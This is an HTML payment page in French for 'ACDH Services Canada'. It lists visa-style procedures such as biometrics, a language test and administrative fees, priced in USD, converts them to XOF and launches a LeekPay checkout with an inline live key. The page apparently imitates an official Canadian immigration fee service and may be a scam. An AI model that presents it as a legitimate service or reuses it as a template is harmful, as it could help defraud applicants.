<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Paiement ACDH</title>

<style>
body{
  font-family:Arial;
  background:
    linear-gradient(rgba(0,0,0,0.6),rgba(0,0,0,0.6)),
    url("background.jpg") no-repeat center;
  background-size:cover;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}

.box{
  background:white;
  padding:30px;
  border-radius:12px;
  width:350px;
  text-align:center;
}

.logo{ width:120px; margin-bottom:10px; }

select,button{
  width:100%;
  padding:12px;
  margin-top:10px;
}

button{
  background:#00bcd4;
  color:white;
  border:none;
  font-weight:bold;
  cursor:pointer;
}

#amount{
  margin-top:10px;
  font-weight:bold;
}
</style>

<script src="https://leekpay.fr/js/leekpay.js"></script>

</head>

<body>

<div class="box">

<img src="logo.png" class="logo">

<h3>Paiement ACDH Services Canada</h3>

<select id="service" onchange="updateAmount()">
  <option value="150">1 - Demande biométrique - 150 USD</option>
  <option value="140">2 - Test de langue - 140 USD</option>
  <option value="230">3 - Droit administratif - 230 USD</option>
  <option value="520">4 - Toutes les procédures - 520 USD</option>
</select>

<p id="amount"></p>

<button onclick="payer()">Payer</button>

<p style="font-size:12px; margin-top:10px;">
Après avoir cliqué sur "Payer", vous serez redirigé vers une page sécurisée pour confirmer votre paiement.
</p>

</div>

<script>

const rate = 600; // conversion USD → XOF

function updateAmount(){
  let usd = parseFloat(service.value);
  let xof = Math.round(usd * rate);

  amount.innerText = "Montant à payer : " + xof + " XOF";
}

function payer(){

  let usd = parseFloat(service.value);
  let xof = Math.round(usd * rate);

  LeekPay.checkout({
    amount: xof,
    currency: "XOF",
    apiKey: "pk_live_OIf3UkphEVWIVAJdd7VB6KWEm7IBuDwK"
  });

}

updateAmount();

</script>

</body>
</html>
